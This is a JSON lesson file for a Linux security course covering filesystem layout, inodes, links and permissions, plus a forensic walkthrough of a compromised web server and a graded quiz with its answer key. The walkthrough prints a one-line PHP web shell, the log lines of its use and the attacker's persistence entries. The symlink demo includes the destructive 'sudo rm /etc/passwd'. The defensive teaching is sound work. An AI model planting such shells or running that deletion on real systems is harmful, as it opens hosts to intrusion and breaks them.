{
  "lesson_id": "3b2aa25c-082d-4ff7-962c-fcde78b16bf4",
  "domain": "linux",
  "title": "Linux Architecture and File System Hierarchy",
  "difficulty": 1,
  "order_index": 1,
  "prerequisites": [],
  "concepts": [
    "Linux kernel architecture",
    "File System Hierarchy Standard (FHS)",
    "Everything is a file philosophy",
    "Virtual file systems (/proc, /sys)",
    "Inodes and file metadata",
    "Hard links vs symbolic links",
    "File permissions model",
    "Mount points and /etc/fstab",
    "Critical system directories",
    "Linux boot process"
  ],
  "estimated_time": 45,
  "learning_objectives": [
    "Understand Linux kernel architecture and system layers",
    "Navigate the File System Hierarchy Standard",
    "Explain the 'everything is a file' philosophy",
    "Differentiate between hard links and symbolic links",
    "Interpret file permissions and ownership",
    "Understand virtual file systems and their security implications",
    "Identify critical system directories and their purposes",
    "Apply file system knowledge for security analysis"
  ],
  "post_assessment": [
    {
      "question": "What is the root directory in Linux called?",
      "options": [
        "C:\\",
        "/",
        "~",
        "/root"
      ],
      "correct_answer": 1,
      "question_id": "34abf67c-02f3-4e30-8615-fa3451467ae2",
      "type": "multiple_choice",
      "difficulty": 1,
      "explanation": "Explanation not provided."
    },
    {
      "question": "Which directory contains user home directories?",
      "options": [
        "/usr",
        "/var",
        "/home",
        "/etc"
      ],
      "correct_answer": 2,
      "question_id": "41fa9ad2-68b0-41f0-aef6-995846a21564",
      "type": "multiple_choice",
      "difficulty": 1,
      "explanation": "Explanation not provided."
    },
    {
      "question": "What does /etc primarily contain?",
      "options": [
        "User files",
        "System configuration files",
        "Executable programs",
        "Temporary files"
      ],
      "correct_answer": 1,
      "question_id": "584d60e9-1a38-42b2-b995-e9a3516aadcb",
      "type": "multiple_choice",
      "difficulty": 1,
      "explanation": "Explanation not provided."
    },
    {
      "question": "What is stored in /var/log?",
      "options": [
        "User documents",
        "System and application logs",
        "Temporary files",
        "Device files"
      ],
      "correct_answer": 1,
      "question_id": "1f82fe7d-5d52-4314-be7a-1fb6dd97b169",
      "type": "multiple_choice",
      "difficulty": 1,
      "explanation": "Explanation not provided."
    },
    {
      "question": "What is the difference between /bin and /sbin?",
      "options": [
        "No difference",
        "/bin for all users, /sbin for system admin commands",
        "/sbin is deprecated",
        "/bin is for scripts only"
      ],
      "correct_answer": 1,
      "question_id": "c70a681b-4fbc-4bfd-b3f8-359ab706bc03",
      "type": "multiple_choice",
      "difficulty": 1,
      "explanation": "Explanation not provided."
    },
    {
      "question": "What type of file system is /proc?",
      "options": [
        "Physical disk filesystem",
        "Virtual filesystem providing process information",
        "Network filesystem",
        "Encrypted filesystem"
      ],
      "correct_answer": 1,
      "question_id": "88fb09a2-8e08-4645-a22c-52a10fa7c251",
      "type": "multiple_choice",
      "difficulty": 1,
      "explanation": "Explanation not provided."
    },
    {
      "question": "What is an inode?",
      "options": [
        "A network node",
        "A data structure storing file metadata",
        "A type of file",
        "A user account"
      ],
      "correct_answer": 1,
      "question_id": "37ef01fa-2819-4ac7-b215-659c2875da3f",
      "type": "multiple_choice",
      "difficulty": 1,
      "explanation": "Explanation not provided."
    },
    {
      "question": "What happens if you delete a hard link to a file?",
      "options": [
        "The file is deleted immediately",
        "The file remains if other links exist",
        "All copies are deleted",
        "The file becomes corrupted"
      ],
      "correct_answer": 1,
      "question_id": "ccc19363-8893-424f-9514-456eca551310",
      "type": "multiple_choice",
      "difficulty": 1,
      "explanation": "Explanation not provided."
    },
    {
      "question": "Where are device files located in Linux?",
      "options": [
        "/devices",
        "/dev",
        "/hardware",
        "/sys"
      ],
      "correct_answer": 1,
      "question_id": "30d2f37c-f8a0-4f9c-927f-678e734e9f7c",
      "type": "multiple_choice",
      "difficulty": 1,
      "explanation": "Explanation not provided."
    },
    {
      "question": "What command shows mounted filesystems?",
      "options": [
        "ls",
        "ps",
        "mount or df",
        "pwd"
      ],
      "correct_answer": 2,
      "question_id": "35390608-5a29-4180-a294-303aa190cd34",
      "type": "multiple_choice",
      "difficulty": 1,
      "explanation": "Explanation not provided."
    }
  ],
  "jim_kwik_principles": [
    "active_learning",
    "minimum_effective_dose",
    "teach_like_im_10",
    "memory_hooks",
    "meta_learning",
    "connect_to_what_i_know",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "type": "explanation",
      "content": {
        "text": "# Welcome to Linux Security\n\nLinux is the backbone of modern cybersecurity infrastructure. From servers and cloud instances to security tools and embedded devices, Linux powers the majority of critical systems. Understanding Linux architecture is essential for:\n\n- **Red Teamers**: Privilege escalation, persistence, lateral movement\n- **Blue Teamers**: Log analysis, incident response, system hardening\n- **DFIR**: Forensic analysis, artifact collection, malware investigation\n- **Cloud Security**: AWS, Azure, GCP all run Linux\n- **Container Security**: Docker, Kubernetes are Linux-based\n\n## Linux vs. Windows: Key Differences\n\n**Philosophy:**\n- Linux: \"Everything is a file\" - uniform interface\n- Windows: Different APIs for files, devices, registry\n\n**Structure:**\n- Linux: Single hierarchical tree starting at /\n- Windows: Multiple drive letters (C:, D:)\n\n**Security Model:**\n- Linux: Traditional Unix permissions + SELinux/AppArmor\n- Windows: Access Control Lists (ACLs) + UAC\n\n**Package Management:**\n- Linux: apt, yum, dnf (centralized repositories)\n- Windows: MSI, exe installers (distributed)\n\nThis lesson covers Linux architecture from a security perspective."
      }
    },
    {
      "type": "video",
      "content": {
        "title": "Video: Linux Architecture and File System Hierarchy Overview",
        "url": "https://www.youtube.com/embed/6OHVjVtjQVw",
        "description": "Watch this video for a visual introduction to the concepts covered in this lesson."
      }
    },
    {
      "type": "mindset_coach",
      "content": {
        "text": "**Mindset: Think Like the System**\n\nLinux can feel overwhelming at first—hundreds of commands, cryptic directory names, no GUI. But here's the secret:\n\n**Linux is actually more consistent than Windows**\n\nOnce you understand the core principles, everything makes sense:\n\n1. **Everything is a file**: Disks, network connections, processes—all accessed as files\n2. **Single tree structure**: No drive letters, just one organized hierarchy\n3. **Permission model**: Read/Write/Execute for Owner/Group/Others—simple and powerful\n4. **Text-based config**: No hidden registry, just text files in /etc\n\n**Your Learning Strategy:**\n\n1. **Hands-on first**: Spin up a Linux VM, explore directories\n2. **Break things safely**: VMs are free, snapshots are easy\n3. **Read man pages**: `man ls`, `man chmod`—built-in documentation\n4. **Practice daily**: Use Linux as your daily driver (VirtualBox/WSL)\n5. **Build mental maps**: Visualize the directory tree\n\n**Pro Tip**: Every confusing Linux feature exists for a reason. When something seems weird, ask \"Why was it designed this way?\" Understanding the reasoning makes it memorable.\n\n**You've got this!** Thousands of cybersecurity professionals learned Linux from scratch. You're next."
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "# Linux Architecture Overview\n\n## System Layers\n\nLinux architecture is organized in layers:\n\n```\n┌─────────────────────────────────────┐\n│     User Applications & Tools       │  <- bash, firefox, tools\n├─────────────────────────────────────┤\n│       System Libraries (glibc)      │  <- printf(), malloc()\n├─────────────────────────────────────┤\n│        System Call Interface        │  <- open(), read(), write()\n├─────────────────────────────────────┤\n│         Linux Kernel (Core)         │  <- Process, memory, driver mgmt\n├─────────────────────────────────────┤\n│        Hardware Abstraction         │\n├─────────────────────────────────────┤\n│          Physical Hardware          │  <- CPU, RAM, Disk, Network\n└─────────────────────────────────────┘\n```\n\n## Kernel Components\n\nThe Linux kernel manages:\n\n**1. Process Management**\n- Creating and scheduling processes\n- Inter-process communication (IPC)\n- Context switching\n\n**2. Memory Management**\n- Virtual memory\n- Page allocation\n- Memory protection\n\n**3. File Systems**\n- VFS (Virtual File System) layer\n- Multiple filesystem support (ext4, xfs, btrfs)\n- File I/O operations\n\n**4. Device Drivers**\n- Hardware abstraction\n- Character and block devices\n- Network interface drivers\n\n**5. Network Stack**\n- TCP/IP implementation\n- Netfilter/iptables (firewall)\n- Socket interface\n\n## Security Implications\n\n**Kernel-Level Access:**\n- Rootkits operate at kernel level\n- Kernel modules (.ko files) can be malicious\n- `/proc/kallsyms` reveals kernel symbols\n\n**System Calls:**\n- All userspace programs use syscalls to access kernel\n- `strace` command traces syscalls (useful for malware analysis)\n- Syscall hooking is a rootkit technique\n\n**Memory Protection:**\n- DEP/NX prevents code execution on stack\n- ASLR randomizes memory addresses\n- Stack canaries detect buffer overflows"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "# File System Hierarchy Standard (FHS)\n\nThe FHS defines the directory structure. Understanding this is crucial for:\n- Finding configuration files\n- Identifying suspicious files\n- Performing forensic analysis\n- Hardening systems\n\n## Critical Directories\n\n### / (Root)\nThe top of the filesystem hierarchy. Everything starts here.\n\n### /bin - Essential Binaries\n```bash\nls, cp, mv, cat, bash, grep, ps\n```\n**Purpose**: Commands needed for system boot and single-user mode\n**Security**: These binaries are targets for trojanization\n**Check integrity**: `rpm -V coreutils` or `debsums coreutils`\n\n### /sbin - System Binaries\n```bash\nifconfig, iptables, fdisk, init, shutdown\n```\n**Purpose**: System administration commands (traditionally root-only)\n**Security**: Privilege escalation often involves these commands\n\n### /etc - Configuration Files\n```bash\n/etc/passwd       # User accounts\n/etc/shadow       # Password hashes\n/etc/group        # Group memberships\n/etc/sudoers      # Sudo permissions\n/etc/ssh/sshd_config  # SSH server config\n/etc/fstab        # Filesystem mount table\n```\n**Purpose**: System-wide configuration\n**Security**: Most critical directory for hardening and forensics\n**Red flags**: Modified timestamps, unexpected files\n\n### /home - User Directories\n```bash\n/home/alice\n/home/bob\n```\n**Purpose**: User personal files\n**Security**: Search for suspicious scripts, SSH keys, credentials\n\n### /root - Root User Home\n**Purpose**: Home directory for root user\n**Security**: Should be tightly restricted\n\n### /var - Variable Data\n```bash\n/var/log          # System and application logs\n/var/www          # Web server files\n/var/mail         # Email storage\n/var/spool        # Print jobs, cron jobs\n```\n**Purpose**: Files that change during system operation\n**Security**: Log analysis starts here, check for log tampering\n\n### /tmp - Temporary Files\n**Purpose**: Temporary storage for all users\n**Security**: \n- World-writable (security risk)\n- Malware often drops files here\n- Should be mounted with `noexec` flag\n- Cleared on reboot (usually)\n\n### /proc - Process Information\n```bash\n/proc/cpuinfo     # CPU information\n/proc/meminfo     # Memory statistics\n/proc/[PID]       # Process-specific information\n/proc/[PID]/cmdline  # Command line arguments\n/proc/[PID]/exe      # Symlink to executable\n/proc/[PID]/fd/      # Open file descriptors\n```\n**Purpose**: Virtual filesystem providing kernel/process information\n**Security**: Rich source for forensics and malware analysis\n\n### /sys - System Information\n```bash\n/sys/class        # Device classes\n/sys/devices      # Device tree\n```\n**Purpose**: Virtual filesystem for kernel device tree\n**Security**: Hardware information, driver details\n\n### /dev - Device Files\n```bash\n/dev/sda          # First hard disk\n/dev/sda1         # First partition\n/dev/null         # Null device (discards all data)\n/dev/zero         # Provides infinite zeros\n/dev/random       # Random number generator\n```\n**Purpose**: Device file interfaces\n**Security**: Direct hardware access, privilege escalation vector\n\n### /usr - User Programs\n```bash\n/usr/bin          # User binaries\n/usr/sbin         # System binaries (non-essential)\n/usr/lib          # Libraries\n/usr/share        # Shared data\n```\n**Purpose**: User-space applications and utilities\n**Security**: Check for malicious binaries, backdoored applications\n\n### /opt - Optional Software\n**Purpose**: Third-party application installs\n**Example**: `/opt/google/chrome`, `/opt/teamviewer`\n**Security**: Less standardized, monitor for suspicious installations"
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "# Hands-On: Exploring the Filesystem\n\n## Exercise 1: Navigate the Hierarchy\n\n```bash\n# Start at root\ncd /\n\n# List all top-level directories\nls -l\n\n# Output:\ndrwxr-xr-x   2 root root  4096 Jan  1 12:00 bin\ndrwxr-xr-x   3 root root  4096 Jan  1 12:00 boot\ndrwxr-xr-x  18 root root  3840 Jan 15 08:30 dev\ndrwxr-xr-x 132 root root 12288 Jan 15 09:15 etc\ndrwxr-xr-x   3 root root  4096 Jan 10 14:20 home\n...\n\n# Explore /etc (configuration files)\nls /etc | head -20\n\n# Find all configuration files modified in last 7 days\nfind /etc -type f -mtime -7\n\n# Show filesystem usage\ndf -h\n\n# Show directory sizes\ndu -sh /*\n```\n\n## Exercise 2: Inspect /proc\n\n```bash\n# Get your current process ID\necho $$\n\n# Example output: 12345\n\n# Explore your shell process\nls -l /proc/12345/\n\n# See command line\ncat /proc/12345/cmdline\n\n# See open files\nls -l /proc/12345/fd/\n\n# See memory maps\ncat /proc/12345/maps\n\n# System-wide information\ncat /proc/cpuinfo\ncat /proc/meminfo\ncat /proc/version\n```\n\n## Exercise 3: Understanding Mount Points\n\n```bash\n# Show all mounted filesystems\nmount\n\n# More readable output\nmount | column -t\n\n# Show disk space\ndf -h\n\n# Show mount options\nfindmnt\n\n# Check /etc/fstab (filesystems to mount at boot)\ncat /etc/fstab\n\n# Example entry:\n# UUID=abc-123  /  ext4  defaults  0  1\n# Device      Mount  FS   Options   Dump Pass\n```\n\n## Exercise 4: Security Checks\n\n```bash\n# Find SUID binaries (potential privilege escalation)\nfind / -perm -4000 -type f 2>/dev/null\n\n# Common legitimate SUID binaries:\n/usr/bin/sudo\n/usr/bin/passwd\n/usr/bin/su\n\n# Find world-writable files\nfind / -perm -002 -type f 2>/dev/null\n\n# Find files with no owner (orphaned files)\nfind / -nouser -o -nogroup 2>/dev/null\n\n# Check /tmp permissions\nls -ld /tmp\n# Should be: drwxrwxrwt (sticky bit set)\n\n# List recently modified files in /etc\nfind /etc -type f -mtime -1\n```\n\n## Exercise 5: File Analysis\n\n```bash\n# Check file type\nfile /bin/ls\n# Output: /bin/ls: ELF 64-bit LSB executable...\n\n# Display file metadata (inode info)\nstat /etc/passwd\n\n# Output:\n  File: /etc/passwd\n  Size: 2419      \tBlocks: 8          IO Block: 4096\n  Device: 801h/2049d\tInode: 131591      Links: 1\nAccess: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)\nAccess: 2025-01-15 09:30:15.123456789\nModify: 2025-01-10 14:22:33.987654321\nChange: 2025-01-10 14:22:33.987654321\n\n# Find large files\nfind / -type f -size +100M 2>/dev/null\n\n# Search for files containing specific text\ngrep -r \"password\" /etc/ 2>/dev/null\n```"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "# Inodes and Links\n\n## What is an Inode?\n\nAn **inode** (index node) is a data structure that stores metadata about a file:\n\n```\nInode Contents:\n- File size\n- Owner (UID/GID)\n- Permissions\n- Timestamps (access, modify, change)\n- Number of hard links\n- Pointers to data blocks\n\nNOT stored in inode:\n- Filename (stored in directory entry)\n```\n\n**Key Point**: The filename and inode are separate. Multiple filenames can point to the same inode (hard links).\n\n## Hard Links\n\n```bash\n# Create a file\necho \"Original content\" > file1.txt\n\n# Create a hard link\nln file1.txt file2.txt\n\n# Check inodes\nls -li file1.txt file2.txt\n\n# Output:\n131072 -rw-r--r-- 2 user user 17 Jan 15 10:00 file1.txt\n131072 -rw-r--r-- 2 user user 17 Jan 15 10:00 file2.txt\n# ^^^^^^ Same inode number!\n\n# Modify file2\necho \"Modified\" >> file2.txt\n\n# file1 also changes (they're the same file!)\ncat file1.txt\n# Output: Original content\n#         Modified\n\n# Delete file1\nrm file1.txt\n\n# file2 still exists (data remains until all links deleted)\ncat file2.txt\n# Output: Original content\n#         Modified\n```\n\n**Hard Link Limitations:**\n- Cannot cross filesystems\n- Cannot link to directories (prevents cycles)\n- Link count must reach 0 before file is deleted\n\n## Symbolic (Soft) Links\n\n```bash\n# Create a symbolic link\nln -s /etc/passwd passwd_link\n\n# Check inodes\nls -li /etc/passwd passwd_link\n\n# Output:\n131591 -rw-r--r-- 1 root root 2419 Jan 10 14:22 /etc/passwd\n262144 lrwxrwxrwx 1 user user   11 Jan 15 10:05 passwd_link -> /etc/passwd\n# ^^^^^^ Different inode!\n\n# Symlink is a special file containing a path\nfile passwd_link\n# Output: passwd_link: symbolic link to /etc/passwd\n\n# Delete original\nsudo rm /etc/passwd\n\n# Symlink breaks (dangling link)\ncat passwd_link\n# Output: cat: passwd_link: No such file or directory\n\nls -l passwd_link\n# Output: lrwxrwxrwx 1 user user 11 Jan 15 10:05 passwd_link -> /etc/passwd\n# Link still exists, but target doesn't\n```\n\n**Symbolic Link Features:**\n- Can cross filesystems\n- Can link to directories\n- Can link to non-existent files\n- Own inode and permissions\n\n## Security Implications\n\n**Hard Links:**\n- Can bypass file deletion (link count > 0)\n- Used in backups (efficient, no duplication)\n- Attacker can maintain access to file even if \"deleted\"\n\n**Symbolic Links:**\n- Symlink attacks: Trick programs into accessing wrong files\n- Race conditions (TOCTOU - Time Of Check, Time Of Use)\n- Example: Create symlink in /tmp pointing to /etc/passwd, trick program into modifying it\n\n**Defense:**\n- Mount /tmp with `noexec` and use symlink protections\n- Check if file is a symlink before opening: `test -L filename`\n- Use `realpath` to resolve symlinks before operations"
      }
    },
    {
      "type": "real_world",
      "content": {
        "text": "# Real-World: Linux Filesystem in Incident Response\n\n## Scenario: Investigating a Compromised Server\n\nYou're investigating a Linux web server that was compromised. The attacker gained initial access via a web application vulnerability and escalated privileges.\n\n## Investigation Workflow\n\n### 1. Check for Backdoors in Critical Directories\n\n```bash\n# Check /etc/passwd for unauthorized users\ncat /etc/passwd | grep -v nologin | grep -v false\n\n# Suspicious entry found:\nhacker:x:0:0::/tmp:/bin/bash  # UID 0 = root!\n\n# Check last modified time\nstat /etc/passwd\n# Modified: 2025-01-10 03:45:22 (middle of night - suspicious)\n```\n\n### 2. Find Malicious Files\n\n```bash\n# Search for recently created files\nfind / -type f -mtime -7 -ls 2>/dev/null\n\n# Suspicious findings:\n/tmp/.hidden_backdoor.sh\n/var/www/html/shell.php\n/root/.ssh/authorized_keys  # Modified recently\n```\n\n### 3. Analyze Web Shell\n\n```bash\n# Examine the PHP shell\ncat /var/www/html/shell.php\n\n# Content:\n<?php system($_GET['cmd']); ?>\n\n# Check web logs for usage\ngrep \"shell.php\" /var/log/apache2/access.log\n\n# Found:\n192.168.1.100 - - [10/Jan/2025:03:40:15] \"GET /shell.php?cmd=whoami HTTP/1.1\" 200\n192.168.1.100 - - [10/Jan/2025:03:42:30] \"GET /shell.php?cmd=cat%20/etc/passwd HTTP/1.1\" 200\n```\n\n### 4. Check for Rootkit\n\n```bash\n# Check SUID binaries\nfind / -perm -4000 2>/dev/null\n\n# Suspicious:\n/tmp/su  # Fake su binary!\n\n# Compare with legitimate\nls -l /bin/su /tmp/su\n-rwsr-xr-x 1 root root 40152 /bin/su\n-rwsr-xr-x 1 root root 12345 /tmp/su  # Different size - trojan!\n\n# Check for kernel module rootkits\nlsmod | grep -v \"^Module\"\n\n# Found:\nsuspicious_module  # Not a standard module\n\n# Remove it\nrmmod suspicious_module\n```\n\n### 5. Timeline Analysis\n\n```bash\n# Build timeline using file modification times\nfind / -type f -newermt \"2025-01-10 03:00\" ! -newermt \"2025-01-10 04:00\" 2>/dev/null\n\n# Timeline:\n03:35 - /var/www/html/shell.php created\n03:40 - Multiple commands executed via web shell\n03:45 - /etc/passwd modified (backdoor user added)\n03:47 - /root/.ssh/authorized_keys modified\n03:50 - /tmp/.hidden_backdoor.sh created\n03:55 - Kernel module loaded\n```\n\n### 6. Examine Persistence Mechanisms\n\n```bash\n# Check cron jobs\ncrontab -l  # User cron\ncat /etc/crontab  # System cron\nls /etc/cron.*  # Cron directories\n\n# Found in /etc/cron.daily/update:\n#!/bin/bash\n/tmp/.hidden_backdoor.sh &\n\n# Check systemd services\nsystemctl list-unit-files | grep enabled\n\n# Found:\nsuspicious.service  # Not standard!\n\n# Examine it\ncat /etc/systemd/system/suspicious.service\n\n[Service]\nExecStart=/tmp/.hidden_backdoor.sh\n\n# Check SSH keys\ncat /root/.ssh/authorized_keys\n\n# Found:\nssh-rsa AAAAB3NzaC1yc2EAAA... attacker@evil.com\n```\n\n## Remediation Steps\n\n```bash\n# 1. Remove backdoor user\nuserdel -r hacker\n\n# 2. Remove malicious files\nrm /tmp/.hidden_backdoor.sh\nrm /var/www/html/shell.php\nrm /tmp/su\n\n# 3. Remove persistence\nrm /etc/cron.daily/update\nsystemctl disable suspicious.service\nrm /etc/systemd/system/suspicious.service\n\n# 4. Clean SSH keys\n> /root/.ssh/authorized_keys  # Clear file\n# Re-add only legitimate keys\n\n# 5. Update all packages\napt update && apt upgrade -y\n\n# 6. Harden system\nchmod 700 /root\nchmod 600 /etc/shadow\n# Install fail2ban, configure firewall\n\n# 7. Monitor\ntail -f /var/log/auth.log\n```\n\n## Lessons Learned\n\n1. **Know your filesystem**: Understanding FHS made finding malicious files easier\n2. **Check timestamps**: Modifications at unusual times are red flags\n3. **Compare file sizes**: Trojanized binaries often have different sizes\n4. **Multiple persistence**: Attackers often use several persistence mechanisms\n5. **/proc is your friend**: Rich information for forensics\n\n**Prevention**: Regular file integrity monitoring (AIDE, Tripwire), secure configurations, prompt patching."
      }
    },
    {
      "type": "reflection",
      "content": {
        "text": "# Reflection and Next Steps\n\n## Key Takeaways\n\n1. **Linux Filesystem is Logical**: Once you understand FHS, navigation is intuitive\n2. **/etc is Critical**: Configuration files reveal system state and changes\n3. **/var/log is Essential**: Logs tell the story of system events\n4. **/proc is Powerful**: Virtual filesystem for live system information\n5. **Everything is a File**: Consistent interface simplifies many operations\n\n## Security Mindset\n\nWhen analyzing Linux systems, always ask:\n- What files were recently modified? (`find -mtime`)\n- Are there unexpected SUID binaries? (`find -perm -4000`)\n- Are there orphaned files? (`find -nouser`)\n- What's listening on network ports? (Next lesson!)\n- What processes are running? (Next lesson!)\n\n## Practice Exercises\n\n1. **Explore Your System**: Navigate through all major directories, understand their contents\n2. **Create a Filesystem Map**: Draw the directory tree with key directories\n3. **Find Anomalies**: Practice finding recently modified files, SUID binaries\n4. **Analyze /proc**: Pick a running process, explore its /proc/[PID] directory\n5. **Build a Timeline**: Pick a time range, find all file modifications\n\n## Coming Next\n\nIn the next lessons, you'll learn:\n- **User Management**: /etc/passwd, /etc/shadow, sudo, permissions\n- **Process Management**: ps, top, /proc, signals, process trees\n- **Networking**: ifconfig, netstat, iptables, network security\n- **Services**: systemd, cron, logging, system startup\n\n**Well done!** You've taken the first step in mastering Linux security."
      }
    }
  ]
}